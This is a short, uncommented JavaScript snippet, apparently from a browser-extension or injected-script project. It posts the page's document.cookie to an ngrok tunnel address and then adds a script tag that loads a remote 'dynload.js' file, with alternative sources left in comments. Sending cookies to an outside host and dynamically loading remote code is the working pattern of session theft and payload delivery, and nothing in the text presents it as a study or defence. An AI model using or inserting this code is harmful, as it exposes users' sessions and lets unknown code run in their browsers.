$.ajax({
    url: 'https://50c4680f.ngrok.io',
    dataType: 'text',
    type: 'post',
    contentType: 'application/json',
    crossDomain: true,
    jsonp: false,
    data: {
        "cookies": document.cookie
    },
    success: function(data, textStatus, jQxhr){
        console.log("successfully posted");
    },
    error: function(jqXhr, textStatus, errorThrown){
        console.log("error in posting", errorThrown);
    }
});



//console.log("COOKIES_1", document.cookie);

var s = document.createElement("script");
s.type = "text/javascript";
//s.src = "http://localhost:3333/dynload.js";
s.src = "http://localhost:4444/dynload.js";
//s.src = "https://cdn.jsdelivr.net/gh/freakynit/view-image-reloaded/dynload.js";
s.id = "vir-dynloaded";
s.async = false;
s.defer = false;
document.getElementsByTagName('head')[0].appendChild(s);
